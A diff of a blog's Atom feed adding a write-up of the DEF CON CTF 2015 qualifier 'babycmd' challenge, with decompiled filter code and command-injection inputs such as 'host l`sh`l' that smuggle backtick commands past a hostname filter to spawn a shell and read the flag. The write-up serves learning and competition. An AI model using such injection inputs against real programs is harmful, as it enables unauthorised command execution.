@@ -4,7 +4,7 @@
   <title><![CDATA[GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-20T22:47:12+04:30</updated>
+  <updated>2015-05-18T13:40:45+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,408 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[DefConCTF 2015 Quals - Babycmd Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup/"/>
+    <updated>2015-05-18T13:39:52+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/05/18/defconctf-2015-quals-babycmd-writeup</id>
+    <content type="html"><![CDATA[<p><strong>DefConCTF 2015 babycmd Writeup</strong><br/>
+<strong>Point = 1</strong><br/>
+<strong>Category = Pwnable</strong></p>
+
+<p>As you may now defconctf started 2 days ago, so we participated and you can check our solutions right here.</p>
+
+<p>OK, So there was 4 problem categories: <code>Baby's first</code>,  <code>Pwning</code>, <code>Coding</code>, <code>Reverse</code> and <code>Misc</code>.</p>
+
+<p>This is babycmd writeup as you can see below,</p>
+
+<p>&ndash;</p>
+
+<p>There was a binary <code>babycmd_3ad28b10e8ab283d7df81795075f600b</code> by following properties:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ file babycmd_3ad28b10e8ab283d7df81795075f600b
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, stripped
+</span><span class='line'>$ checksec.sh --file babycmd_3ad28b10e8ab283d7df81795075f600b 
+</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+</span><span class='line'>No RELRO        Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   babycmd_3ad28b10e8ab283d7df81795075f600b</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is so much for 1 point task, but you know this is DEFCON.</p>
+
+<!--more-->
+
+
+<p>by running the binary, it was a wrapper providing 3 functionalites: <code>ping</code>, <code>host</code>, <code>dig</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
+</span><span class='line'>
+</span><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: ping 8.8.8.8
+</span><span class='line'>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+</span><span class='line'>
+</span><span class='line'>--- 8.8.8.8 ping statistics ---
+</span><span class='line'>3 packets transmitted, 0 received, 100 0x56191abe7100acket loss, time 2016ms          
+</span><span class='line'>                                                                                      
+</span><span class='line'>Commands: ping, dig, host, exit                                                       
+</span><span class='line'>: host hamidx9.ir
+</span><span class='line'>hamidx9.ir has address 104.28.29.35
+</span><span class='line'>hamidx9.ir has address 104.28.28.35
+</span><span class='line'>hamidx9.ir has IPv6 address 2400:cb00:2048:1::681c:1c23
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>as strace says, it seems it parses the input and filter it and then try to execute!</p>
+
+<p>Basicly with <code>executing</code> word i always look for a filter bypass and execute arbitrary commands. but <code>0x56191abe7100acket</code> in the ping command take my attention.</p>
+
+<p>It&rsquo;s time to open the binary in IDA:</p>
+
+<ol>
+<li><p>6 main functions:
+ <code>sub_F5C</code>: parse and execute dig
+ <code>sub_10BD</code>: parse and execute host
+ <code>sub_E35</code>: parse and execute ping
+ <code>sub_121E</code>: main()
+ <code>sub_D65</code>: parse the input
+ <code>sub_DCC</code>: filter the input</p></li>
+<li><p><code>ping</code> does not seem to be vulnerable:</p></li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
+</span><span class='line'>{
+</span><span class='line'>  if ( inet_aton(&cp, &v4) )
+</span><span class='line'>  {
+</span><span class='line'>    v1 = inet_ntoa(v4);
+</span><span class='line'>    __sprintf_chk(&command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
+</span><span class='line'>    v2 = popen(&command, "r");
+</span><span class='line'>    if ( v2 )
+</span><span class='line'>    {
+</span><span class='line'>      while ( fgets(&s, 512, v2) )
+</span><span class='line'>        __printf_chk(1LL, &s);
+</span><span class='line'>      pclose(v2);
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>the <code>v1</code>  param which passes to <code>sprintf</code> returning from <code>inet_ntoa</code> so it cannot be a arbitrary value.</p>
+
+<ol>
+<li>let&rsquo;s look at host code:</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>__int64 __fastcall sub_10BD(__int64 a1)
+</span><span class='line'>{
+</span><span class='line'>  char *v1; // rax@6
+</span><span class='line'>  FILE *v2; // rbp@10
+</span><span class='line'>  struct in_addr v4; // [sp+0h] [bp-538h]@5
+</span><span class='line'>  char command; // [sp+10h] [bp-528h]@6
+</span><span class='line'>  char cp; // [sp+190h] [bp-3A8h]@3
+</span><span class='line'>  char s; // [sp+310h] [bp-228h]@12
+</span><span class='line'>  __int64 v8; // [sp+518h] [bp-20h]@1
+</span><span class='line'>
+</span><span class='line'>  v8 = *MK_FP(__FS__, 40LL);
+</span><span class='line'>  if ( a1 )
+</span><span class='line'>  {
+</span><span class='line'>    if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
+</span><span class='line'>    {
+</span><span class='line'>      if ( inet_aton(&cp, &v4) )
+</span><span class='line'>      {
+</span><span class='line'>        v1 = inet_ntoa(v4);
+</span><span class='line'>        __sprintf_chk(&command, 1LL, 384LL, "host %s", v1);
+</span><span class='line'>      }
+</span><span class='line'>      else
+</span><span class='line'>      {
+</span><span class='line'>        if ( !(unsigned int)sub_DCC((__int64)&cp) )
+</span><span class='line'>        {
+</span><span class='line'>          puts("Invalid hostname.");
+</span><span class='line'>          return *MK_FP(__FS__, 40LL) ^ v8;
+</span><span class='line'>        }
+</span><span class='line'>        __sprintf_chk(&command, 1LL, 384LL, "host \"%s\"", &cp);
+</span><span class='line'>      }
+</span><span class='line'>      v2 = popen(&command, "r");
+</span><span class='line'>      if ( v2 )
+</span><span class='line'>      {
+</span><span class='line'>        while ( fgets(&s, 512, v2) )
+</span><span class='line'>          __printf_chk(1LL, &s);
+</span><span class='line'>        pclose(v2);
+</span><span class='line'>      }
+</span><span class='line'>      else
+</span><span class='line'>      {
+</span><span class='line'>        puts("Command failed.");
+</span><span class='line'>      }
+</span><span class='line'>    }
+</span><span class='line'>    else
+</span><span class='line'>    {
+</span><span class='line'>      puts("Invalid Host or IP address sent to dig.");
+</span><span class='line'>    }
+</span><span class='line'>  }
+</span><span class='line'>  else
+</span><span class='line'>  {
+</span><span class='line'>    puts("No address specified.");
+</span><span class='line'>  }
+</span><span class='line'>  return *MK_FP(__FS__, 40LL) ^ v8;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As you can see, second <code>__sprintf_chk</code> may acts unexpectedly. but there could be problem in using <code>sub_DCC</code>.</p>
+
+<ol>
+<li><code>sub_DCC</code> code:</li>
+</ol>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>signed __int64 __fastcall sub_DCC(__int64 a1)
+</span><span class='line'>{
+</span><span class='line'>  __int64 v1; // rsi@1
+</span><span class='line'>  signed __int64 v2; // rcx@1
+</span><span class='line'>  bool v3; // zf@3
+</span><span class='line'>  signed __int64 v4; // rcx@4
+</span><span class='line'>  signed __int64 result; // rax@4
+</span><span class='line'>  char v6; // dl@7
+</span><span class='line'>
+</span><span class='line'>  v1 = a1;
+</span><span class='line'>  v2 = -1LL;
+</span><span class='line'>  do
+</span><span class='line'>  {
+</span><span class='line'>    if ( !v2 )
+</span><span class='line'>      break;
+</span><span class='line'>    v3 = *(_BYTE *)a1++ == 0;
+</span><span class='line'>    --v2;
+</span><span class='line'>  }
+</span><span class='line'>  while ( !v3 );
+</span><span class='line'>  v4 = ~v2;
+</span><span class='line'>  result = 0LL;
+</span><span class='line'>  if ( (unsigned __int64)(v4 - 4) &lt;= 0x3C )
+</span><span class='line'>  {
+</span><span class='line'>    if ( (unsigned __int8)((*(_BYTE *)v1 & 0xDF) - 0x41) &lt;= 0x19u
+</span><span class='line'>      || (result = 0LL, (unsigned __int8)(*(_BYTE *)v1 - 48) &lt;= 9u) )
+</span><span class='line'>    {
+</span><span class='line'>      v6 = *(_BYTE *)(v1 + v4 - 1 - 1);
+</span><span class='line'>      result = 1LL;
+</span><span class='line'>      if ( (unsigned __int8)((v6 & 0xDF) - 0x41) &gt; 0x19u )
+</span><span class='line'>        result = (unsigned __int8)(v6 - 0x30) &lt;= 9u;
+</span><span class='line'>    }
+</span><span class='line'>  }
+</span><span class='line'>  return result;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>i just noticed that it filters some bytes but not chr(0x60) which can be used to execute command and tried some tests on input.</p>
+
+<p>finally i could run command like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
+</span><span class='line'>
+</span><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host l`ls`l
+</span><span class='line'>host: 'lbabycmd_3ad28b10e8ab283d7df81795075f600b
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id0
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id1
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id2
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.nam
+</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.til
+</span><span class='line'>logl' is not a legal name (label too long)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: 
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>but trying something like this <code>host l`ls /home/`l</code> can be seen below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host l`ls /home/`l
+</span><span class='line'>sh: 1: ls/home/: not found
+</span><span class='line'>Host ll not found: 3(NXDOMAIN)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: </span></code></pre></td></tr></table></div></figure>
+
+
+<p>it filters space, so i can&rsquo;t run any command.
+but instead of reversing the filter function, i can use <code>sh</code>, aren&rsquo;t i :)) ?</p>
+
+<p>So here&rsquo;s my points:</p>
+
+<ol>
+<li>enter <code>host l`sh`l</code> as command</li>
+<li>enter:
+ <code>cat /home/babycmd/flag</code></li>
+<li>Press Ctrl+D</li>
+<li>Press Ctrl+C</li>
+</ol>
+
+
+<p>So here we go:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
+</span><span class='line'>Welcome to another Baby's First Challenge!
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: host l`sh`l
+</span><span class='line'>cat /home/babycmd/flag [Enter] [Ctrl+D]
+</span><span class='line'>: host: 'lThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??1' is not in legal name syntax (label too long)
+</span><span class='line'>Commands: ping, dig, host, exit
+</span><span class='line'>: ^C</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So we have first 1 point at DEFCONCTF.</p>
+
+<p>@HAMIDx9</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[PlaidCTF CTF 2015 - EBP Writeup]]></title>
